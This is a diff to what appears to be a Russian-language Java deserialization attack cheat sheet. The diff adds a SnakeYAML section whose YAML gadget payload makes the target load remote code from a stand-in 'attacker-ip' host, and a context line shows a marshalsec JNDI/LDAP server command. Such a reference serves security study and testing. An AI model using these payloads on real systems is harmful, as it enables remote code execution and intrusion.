@@ -153,9 +153,9 @@ $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#e
 Любой из следующих вариантов:
 
 ```Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object```
-
 * com.fasterxml.jackson.databind
 * org.codehaus.jackson.map
+
 
 * **Эксплуатация**
 
@@ -210,3 +210,21 @@ CVE-2020-9548
   }
 ]
 ```
+
+# Десериализация YAML
+
+* [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)
+* [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)
+* [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)
+
+* **SnakeYAML**
+
+> SnakeYAML — популярная библиотека на основе Java, используемая для анализа и вывода данных в формате YAML (YAML не является языком разметки). Она предоставляет простой в использовании API для работы с YAML — стандартом сериализации данных, понятным человеку, который обычно используется для файлов конфигурации и обмена данными.
+
+```yaml
+!!javax.script.ScriptEngineManager [
+!!java.net.URLClassLoader [[
+!!java.net.URL ["http://attacker-ip/"]
+]]
+```
+]
